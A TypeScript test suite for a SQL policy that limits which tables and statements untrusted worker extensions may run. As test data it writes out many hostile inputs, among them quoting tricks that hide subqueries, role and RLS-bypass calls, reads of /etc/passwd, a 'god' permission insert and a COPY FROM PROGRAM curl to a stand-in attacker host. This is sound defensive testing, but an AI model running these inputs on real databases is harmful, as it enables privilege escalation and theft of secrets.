/**
 * Worker→host SQL bridge table policy.
 *
 * `enforcePublisherTier` routes community (untrusted) extensions into a worker
 * because the worker is meant to be the trust boundary. The bridge previously
 * ran their SQL with pool.unsafe() and no restriction at all, so these cases
 * pin the rule that now applies — including the case-folding and
 * schema-qualification tricks that get used to walk past a name check.
 */

import { describe, expect, it } from 'bun:test';
import {
  assertWorkerSqlAllowed,
  ownedPrefixFor,
  WorkerSqlPolicyError,
  workerSqlEngineTables,
} from '../../lib/extensions/worker-sql-policy.js';

const EXT = 'ai';
/** The engine's own tables, read from its migrations as the bridge reads them. */
const ENGINE = await workerSqlEngineTables();

function allowed(sql: string): boolean {
  try {
    assertWorkerSqlAllowed(EXT, sql, ENGINE);
    return true;
  } catch (e) {
    if (e instanceof WorkerSqlPolicyError) return false;
    throw e;
  }
}

describe('ownedPrefixFor', () => {
  it('matches the inline proxy convention', () => {
    expect(ownedPrefixFor('ai')).toBe('zv_ai_');
    expect(ownedPrefixFor('compliance/ro/saft')).toBe('zv_compliance_ro_saft_');
  });
});

describe('assertWorkerSqlAllowed — engine tables', () => {
  const blocked = [
    'SELECT * FROM zv_api_keys',
    'SELECT * FROM zv_tenants',
    'SELECT * FROM zvd_orders JOIN zv_api_keys ON true',
    'UPDATE zv_settings SET value = $1',
    'DELETE FROM zvd_orders WHERE id IN (SELECT id FROM zv_tenant_users)',
    'INSERT INTO zv_scim_tokens (name) VALUES ($1)',
  ];
  for (const sql of blocked) {
    it(`blocks: ${sql.slice(0, 46)}`, () => {
      expect(allowed(sql)).toBe(false);
    });
  }

  it('blocks regardless of case', () => {
    expect(allowed('SELECT * FROM ZV_API_KEYS')).toBe(false);
    expect(allowed('SELECT * FROM Zv_Api_Keys')).toBe(false);
  });

  it('blocks a schema-qualified reference', () => {
    expect(allowed('SELECT * FROM public.zv_api_keys')).toBe(false);
  });

  it('blocks a quoted identifier', () => {
    expect(allowed('SELECT * FROM "zv_api_keys"')).toBe(false);
    expect(allowed('SELECT * FROM public."ZV_API_KEYS"')).toBe(false);
  });

  it('names every offending table in the error', () => {
    try {
      assertWorkerSqlAllowed(EXT, 'SELECT * FROM zv_tenants, zv_api_keys', ENGINE);
      throw new Error('should have thrown');
    } catch (e) {
      expect((e as Error).message).toContain('zv_api_keys');
      expect((e as Error).message).toContain('zv_tenants');
    }
  });
});

describe('assertWorkerSqlAllowed — what stays permitted', () => {
  const permitted = [
    'SELECT * FROM zvd_orders',
    'SELECT * FROM zvd_orders WHERE total > $1',
    'INSERT INTO zvd_invoices (id) VALUES ($1)',
    'SELECT * FROM zv_ai_providers',
    'UPDATE zv_ai_chats SET title = $1 WHERE id = $2',
    'SELECT a.* FROM zvd_orders a JOIN zv_ai_providers b ON a.p = b.id',
  ];
  for (const sql of permitted) {
    it(`allows: ${sql.slice(0, 46)}`, () => {
      expect(allowed(sql)).toBe(true);
    });
  }

  it('does not confuse zvd_ with zv_', () => {
    // 'zvd_x' must not be read as an engine table — the third char is 'd'.
    expect(allowed('SELECT * FROM zvd_zv_weird')).toBe(true);
  });

  // ── Words after FROM and JOIN that are not tables ────────────────────────
  //
  // Found by running this policy over every raw statement the first-party
  // extensions actually ship: it refused `lateral`, `now`, `date`,
  // `start_date` and `invoice_date`, none of which is a table. A gate that
  // names a table nobody wrote is a gate whose next report is not believed.

  it('reads JOIN LATERAL as a subquery, not a table called lateral', () => {
    // `hr/employees` ships exactly this shape.
    expect(allowed('SELECT e.id FROM zvd_employees e LEFT JOIN LATERAL (SELECT 1) x ON true')).toBe(
      true,
    );
  });

  it('also handles LATERAL over a set-returning function', () => {
    // The form with no parenthesis directly after the keyword. Written after a
    // first attempt to prove the LATERAL rule failed to discriminate: with the
    // subquery form alone, the function-call rule below already covered it, so
    // the rule looked necessary while doing nothing.
    expect(allowed('SELECT * FROM zvd_orders o JOIN LATERAL generate_series(1, 3) g ON true')).toBe(
      true,
    );
  });

  it('does not read a function call after FROM as a table', () => {
    expect(allowed('SELECT * FROM zvd_orders WHERE created_at > now()')).toBe(true);
    expect(allowed('SELECT EXTRACT(YEAR FROM now()) FROM zvd_orders')).toBe(true);
  });

  it("does not read EXTRACT's keyword argument as a table", () => {
    // `EXTRACT(EPOCH FROM start_date)` — the word after FROM is a column.
    expect(allowed('SELECT EXTRACT(EPOCH FROM start_date) FROM zvd_leave')).toBe(true);
    expect(allowed("SELECT TRIM(BOTH ' ' FROM name) FROM zvd_contacts")).toBe(true);
    expect(allowed('SELECT SUBSTRING(code FROM 2) FROM zvd_items')).toBe(true);
  });

  // Shapes Kysely compiles from ordinary builder calls, which reach this
  // analyzer since `ctx.db`'s builder is checked on its compiled SQL.
  it('does not read row-lock clauses or IS DISTINCT FROM as tables', () => {
    expect(allowed('SELECT * FROM zvd_jobs FOR UPDATE SKIP LOCKED')).toBe(true);
    expect(allowed('SELECT * FROM zvd_jobs FOR NO KEY UPDATE NOWAIT')).toBe(true);
    expect(allowed('SELECT * FROM zvd_jobs j FOR UPDATE OF j')).toBe(true);
    expect(allowed('SELECT * FROM zvd_a WHERE a IS DISTINCT FROM b')).toBe(true);
    expect(allowed('SELECT * FROM zvd_a WHERE a IS NOT DISTINCT FROM b')).toBe(true);
  });

  it('reads the table a USING clause names, and nothing in a JOIN … USING (col)', () => {
    expect(allowed('DELETE FROM zvd_a USING "session" WHERE false')).toBe(false);
    expect(allowed('MERGE INTO zvd_a USING session s ON false WHEN MATCHED THEN DELETE')).toBe(
      false,
    );
    expect(allowed('DELETE FROM zvd_a USING zvd_b WHERE zvd_a.id = zvd_b.id')).toBe(true);
    expect(allowed('SELECT * FROM zvd_a JOIN zvd_b USING (id)')).toBe(true);
  });

  it('still refuses an engine table inside such a statement', () => {
    // The relaxations above must not become a hiding place: a real table
    // reference elsewhere in the same statement is still read.
    expect(
      allowed(
        'SELECT EXTRACT(EPOCH FROM start_date) FROM "session" JOIN LATERAL (SELECT 1) x ON true',
      ),
    ).toBe(false);
    expect(allowed('SELECT * FROM zvd_orders WHERE id IN (SELECT id FROM "user")')).toBe(false);
  });
});

describe('assertWorkerSqlAllowed — hiding places', () => {
  it('ignores a table name that only appears inside a string literal', () => {
    expect(allowed("SELECT * FROM zvd_logs WHERE msg = 'read zv_api_keys please'")).toBe(true);
  });

  it('still catches the real reference when a decoy string is present', () => {
    expect(allowed("SELECT * FROM zv_api_keys WHERE note = 'zvd_orders'")).toBe(false);
  });

  it('does not let a line comment conceal a reference', () => {
    // The comment is blanked, so the only live reference is the permitted one.
    expect(allowed('SELECT * FROM zvd_orders -- zv_api_keys')).toBe(true);
    expect(allowed('SELECT * FROM zv_api_keys -- zvd_orders')).toBe(false);
  });

  it('handles block comments and dollar-quoted bodies', () => {
    expect(allowed('SELECT * FROM zvd_orders /* zv_api_keys */')).toBe(true);
    expect(allowed('SELECT $tag$ zv_api_keys $tag$, x FROM zvd_orders')).toBe(true);
  });

  it('handles escaped quotes without losing track of the string', () => {
    expect(allowed("SELECT * FROM zvd_orders WHERE a = 'it''s zv_api_keys'")).toBe(true);
  });

  // Each of these is a place where the scan and Postgres disagreed about where
  // a string or a comment ends. The scan blanked SQL that Postgres then ran —
  // measured with psql, each returned the subquery's row.
  it('reads E-strings, identifier dollars, quoted identifiers and CR as Postgres does', () => {
    expect(allowed("SELECT E'\\'', (SELECT token FROM session) AS t, '' FROM zvd_a")).toBe(false);
    expect(allowed("SELECT E'\\''; TRUNCATE session; SELECT ''")).toBe(false);
    expect(allowed('SELECT x$$, (SELECT token FROM session) AS t --$$\n FROM zvd_a')).toBe(false);
    expect(allowed('SELECT 1 -- x\r, (SELECT token FROM session) FROM zvd_a')).toBe(false);
    expect(allowed(`SELECT 1 AS "a'b", (SELECT token FROM session) AS "c'" FROM zvd_a`)).toBe(
      false,
    );
    expect(allowed('SELECT 1 AS "--", (SELECT token FROM session) FROM zvd_a')).toBe(false);
    // a dollar tag of any length, in Postgres' identifier alphabet
    for (const tag of [`$${'t'.repeat(70)}$`, '$é$', '$aé1$']) {
      expect(
        allowed(
          `SELECT ${tag} ' ${tag} AS a, (SELECT token FROM session) AS t, ' ' AS b FROM zvd_a`,
        ),
      ).toBe(false);
    }
    // and still read a string as a string
    expect(allowed("SELECT E'it\\'s zv_api_keys' FROM zvd_a")).toBe(true);
    expect(allowed("SELECT date'2026-01-01', 'a\\' FROM zvd_a")).toBe(true);
    expect(allowed('SELECT $q$ zv_api_keys; $q$ FROM zvd_a')).toBe(true);
  });
});

describe('assertWorkerSqlAllowed — bodies that execute as code', () => {
  // Blanking dollar-quoted blocks keeps a table name *mentioned* in a string
  // from being read as a reference. It also emptied the one place where a
  // reference is most dangerous: the body of a DO block, which Postgres runs as
  // the database owner. Nothing was left for the scan to find.
  it('refuses a DO block that hides an engine table in its body', () => {
    expect(allowed('DO $$ BEGIN PERFORM * FROM zv_api_keys; END $$')).toBe(false);
    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT k FROM zv_api_keys'; END $$")).toBe(false);
  });

  it('refuses a DO block even when the body names nothing at all', () => {
    // The point is not what this body says — it is that a body can build its
    // SQL by concatenation, so no text scan can clear one.
    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT 1 FROM zv_' || 'api_keys'; END $$")).toBe(false);
  });

  it('refuses it however the block is dressed up', () => {
    expect(allowed('  \n do $tag$ BEGIN END $tag$')).toBe(false);
    expect(allowed('/* harmless */ DO $$ BEGIN END $$')).toBe(false);
    expect(allowed('DO LANGUAGE plpgsql $$ BEGIN END $$')).toBe(false);
  });

  it('refuses the other ways a string becomes executable SQL', () => {
    expect(allowed('CALL some_procedure()')).toBe(false);
    expect(allowed('CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql')).toBe(false);
    expect(allowed('CREATE OR REPLACE PROCEDURE p() AS $$ BEGIN END $$ LANGUAGE plpgsql')).toBe(
      false,
    );
    expect(allowed('PREPARE s AS SELECT 1')).toBe(false);
    expect(allowed('EXECUTE s')).toBe(false);
    expect(allowed("COPY zvd_orders FROM PROGRAM 'curl attacker.example'")).toBe(false);
  });

  it('refuses LOCK — names no table the allowlist below can see, and Postgres grants it on the SELECT the worker already holds', () => {
    // `zvd_*` is a shared physical table across every tenant (RLS filters
    // rows, it does not split the table), so an ACCESS EXCLUSIVE lock on one
    // freezes every tenant's access to it, not just this extension's own rows.
    expect(allowed('LOCK TABLE zvd_orders IN ACCESS EXCLUSIVE MODE')).toBe(false);
    expect(allowed('LOCK zvd_orders')).toBe(false);
    expect(allowed('lock table "zvd_orders"')).toBe(false);
  });

  it('does not fire on ordinary SQL that merely contains the words', () => {
    // A gate that rejects `ON CONFLICT DO NOTHING` would be turned off.
    expect(allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT DO NOTHING')).toBe(true);
    expect(
      allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT (id) DO UPDATE SET id = $1'),
    ).toBe(true);
    expect(allowed("SELECT * FROM zvd_logs WHERE msg = 'call me' OR msg = 'do it'")).toBe(true);
    expect(allowed('SELECT * FROM zvd_orders WHERE note = $$ do $$')).toBe(true);
  });

  it('still allows a dollar-quoted string constant', () => {
    // The behaviour the blanking exists for, kept intact.
    expect(allowed('SELECT $tag$ zv_api_keys $tag$, x FROM zvd_orders')).toBe(true);
  });
});

/**
 * Statement kinds: queries and DML only.
 *
 * The table scan reads FROM/JOIN/INTO/UPDATE/USING positions. DDL, TRUNCATE,
 * GRANT, COMMENT and SET name their target elsewhere or nowhere, so each was
 * accepted and ran as the engine role — measured through `ctx.db`.
 */
describe('assertWorkerSqlAllowed — statement kinds', () => {
  it('refuses every kind that is not a query or DML, on any table', () => {
    for (const s of [
      'TRUNCATE "session"',
      'TRUNCATE TABLE zv_api_keys',
      'TRUNCATE zvd_orders',
      'ALTER TABLE "user" DISABLE ROW LEVEL SECURITY',
      'DROP TABLE zv_api_keys',
      'CREATE TABLE zvd_new (id int)',
      'CREATE TRIGGER t AFTER INSERT ON zv_api_keys FOR EACH ROW EXECUTE FUNCTION f()',
      'GRANT SELECT ON session TO PUBLIC',
      'REVOKE ALL ON zvd_orders FROM zveltio_rls',
      "COMMENT ON TABLE zv_api_keys IS 'x'",
      'SET LOCAL zveltio.rls_bypass = on',
      'SET SESSION ROLE postgres',
      "SET search_path = 'evil'",
      'RESET ALL',
      'RESET ROLE',
      "COPY zvd_orders TO '/tmp/x'",
      'VACUUM zvd_orders',
      'ANALYZE zvd_orders',
      'LISTEN zveltio_cache',
      "NOTIFY zveltio_cache, 'x'",
      'EXPLAIN ANALYZE CREATE TABLE zvd_x AS SELECT 1',
      'SHOW ALL',
      'REFRESH MATERIALIZED VIEW zvd_mv',
      'DISCARD ALL',
      "LOAD '/tmp/evil.so'",
      'BEGIN',
      'COMMIT',
      'SAVEPOINT s',
      'ROLLBACK TO SAVEPOINT s',
      '/* hidden */ TRUNCATE zvd_orders',
      '',
    ]) {
      expect(allowed(s), s).toBe(false);
    }
  });

  it('refuses a second statement after a semicolon', () => {
    // The pool sends a parameterless query through the simple-query protocol,
    // which runs every statement in it.
    expect(allowed('SELECT 1 FROM zvd_orders; TRUNCATE "session"')).toBe(false);
    expect(allowed('SELECT 1; SELECT 2')).toBe(false);
    expect(allowed('SELECT 1 FROM zvd_orders;')).toBe(true);
    expect(allowed("SELECT * FROM zvd_orders WHERE note = 'a; b'")).toBe(true);
  });

  it('reads TABLE x as a table reference, as a statement and as a subquery', () => {
    expect(allowed('TABLE session')).toBe(false);
    expect(allowed('SELECT EXISTS (TABLE session)')).toBe(false);
    expect(allowed('SELECT * FROM zvd_orders WHERE id IN (TABLE zv_api_keys)')).toBe(false);
    expect(allowed('SELECT 1 FROM zvd_orders UNION TABLE "user"')).toBe(false);
    expect(allowed('TABLE zvd_orders')).toBe(true);
    // A column label is not a table.
    expect(allowed('SELECT 1 AS table FROM zvd_orders')).toBe(true);
    expect(allowed('SELECT 1 AS "table", t.table FROM zvd_orders t')).toBe(true);
  });

  it('refuses SELECT … INTO, which creates a table', () => {
    expect(allowed('SELECT * INTO zvd_copy FROM zvd_orders')).toBe(false);
    expect(allowed('WITH x AS (SELECT 1) SELECT * INTO zvd_copy FROM x')).toBe(false);
  });

  it('allows queries and DML in every shape', () => {
    for (const s of [
      'SELECT 1',
      '(SELECT id FROM zvd_orders) UNION ALL (SELECT id FROM zvd_items)',
      'VALUES (1), (2)',
      'WITH w AS (INSERT INTO zvd_orders (id) VALUES ($1) RETURNING id) SELECT id FROM w',
      'MERGE INTO zvd_orders t USING zvd_items s ON t.id = s.id WHEN MATCHED THEN DELETE',
      'INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT (id) DO UPDATE SET id = $1',
      'UPDATE zvd_orders SET n = n + 1 WHERE id = $1',
      'DELETE FROM zvd_orders WHERE id = $1',
      'SET TRANSACTION READ ONLY',
      "SELECT current_setting('zveltio.current_tenant', true)",
      'SELECT pg_advisory_xact_lock(42)',
    ]) {
      expect(allowed(s), s).toBe(true);
    }
  });
});

describe('assertWorkerSqlAllowed — functions that leave the sandbox', () => {
  it('refuses the GUC setter, however it is spelled', () => {
    // The request transaction runs as zveltio_rls; the session user is the
    // engine's, so `role` = none drops back to it, and rls_bypass turns RLS off.
    expect(allowed("SELECT set_config('zveltio.rls_bypass', 'on', true)")).toBe(false);
    expect(allowed("SELECT pg_catalog.set_config('role', 'none', true)")).toBe(false);
    expect(allowed("SELECT \"set_config\"('role', 'none', true)")).toBe(false);
    expect(allowed("SELECT * FROM zvd_orders WHERE SET_CONFIG ('a', 'b', true) IS NOT NULL")).toBe(
      false,
    );
  });

  it('refuses the server, the file system and other connections', () => {
    for (const s of [
      "SELECT pg_read_file('/etc/passwd')",
      "SELECT lo_import('/etc/passwd')",
      'SELECT lo_get(16384)',
      "SELECT dblink('host=x', 'select 1')",
      'SELECT pg_terminate_backend(1)',
      'SELECT pg_reload_conf()',
      "SELECT pg_ls_dir('.')",
      "SELECT pg_notify('zveltio_cache', 'x')",
      'SELECT pg_advisory_lock(42)',
      'SELECT pg_advisory_unlock_all()',
      "SELECT pg_create_logical_replication_slot('s', 'pgoutput')",
    ]) {
      expect(allowed(s), s).toBe(false);
    }
  });

  it('refuses functions that take a query or a relation as a string', () => {
    expect(allowed("SELECT query_to_xml('select token from session', true, false, '')")).toBe(
      false,
    );
    expect(allowed("SELECT table_to_xml('session', true, false, '')")).toBe(false);
    expect(allowed("SELECT * FROM ts_stat('select tsv from session')")).toBe(false);
    expect(allowed("SELECT setval('zv_audit_log_id_seq', 1)")).toBe(false);
  });

  it('does not fire on a column or a string that merely carries the name', () => {
    expect(allowed("SELECT set_config_note FROM zvd_orders WHERE x = 'set_config('")).toBe(true);
    expect(allowed('SELECT o.setval FROM zvd_orders o')).toBe(true);
  });
});

/**
 * The catalogue is reconnaissance, not data.
 *
 * `information_schema.tables` and `pg_catalog.pg_authid` disclose every table
 * name, column and role on the instance. A schema-qualified reference is
 * therefore refused on the schema alone — before any of the table-name rules
 * below it get a say, because a table name is not what makes those dangerous.
 *
 * This is the worker bridge's half of the same allowlist that `ctx.db` enforces
 * in-process. Both were prefix denylists once, and both missed the unprefixed
 * Better-Auth tables for the same reason.
 */
describe('assertWorkerSqlAllowed — schema-qualified references', () => {
  it('refuses the system catalogues by schema, whatever the table is called', () => {
    for (const q of [
      'SELECT * FROM information_schema.tables',
      'SELECT * FROM pg_catalog.pg_authid',
      'SELECT rolname FROM pg_catalog.pg_roles',
    ]) {
      expect(() => assertWorkerSqlAllowed('finance/banking', q, ENGINE)).toThrow(
        WorkerSqlPolicyError,
      );
    }
  });

  it('names what it refused, so the author can see which reference was the problem', () => {
    expect(() =>
      assertWorkerSqlAllowed('finance/banking', 'SELECT * FROM information_schema.columns', ENGINE),
    ).toThrow(/information_schema\.columns/);
  });

  it('allows an explicit public-schema reference to a table the extension may read', () => {
    // `public` is where everything the extension owns lives, so qualifying with it
    // must not itself be an offence — only another schema is.
    expect(() =>
      assertWorkerSqlAllowed('finance/banking', 'SELECT * FROM public.zvd_invoices', ENGINE),
    ).not.toThrow();
  });
});

describe('assertWorkerSqlAllowed — the engine metadata that shares the zvd_ prefix', () => {
  // `zvd_permissions` is the Casbin policy table. Through the bridge's fallback
  // role (`zveltio_rls`, which holds DML on it) a worker extension could insert
  // itself a `god` grant: the prefix check let every `zvd_` name through.
  it('refuses the engine tables the migrations create under zvd_', () => {
    for (const q of [
      "INSERT INTO zvd_permissions (ptype, v0, v1, v2) VALUES ('g', 'x', 'god', '*')",
      'UPDATE "zvd_rls_policies" SET using_expr = $1',
      'SELECT * FROM public.zvd_column_permissions',
      'DELETE FROM ZVD_COLLECTIONS',
      'SELECT secret FROM zvd_webhooks',
      'SELECT token FROM zvd_push_tokens',
      'SELECT * FROM zvd_invoices i JOIN zvd_rpc_functions f ON true',
    ]) {
      expect({ q, ok: allowed(q) }).toEqual({ q, ok: false });
    }
  });

  it('derives the list rather than naming it — every engine zvd_ table is in it', () => {
    const zvd = [...ENGINE].filter((t) => t.startsWith('zvd_'));
    expect(zvd).toContain('zvd_permissions');
    expect(zvd).toContain('zvd_rls_policies');
    for (const t of zvd) expect({ t, ok: allowed(`SELECT 1 FROM ${t}`) }).toEqual({ t, ok: false });
  });

  it('still lets a collection through', () => {
    expect(allowed('SELECT * FROM zvd_invoices')).toBe(true);
  });
});
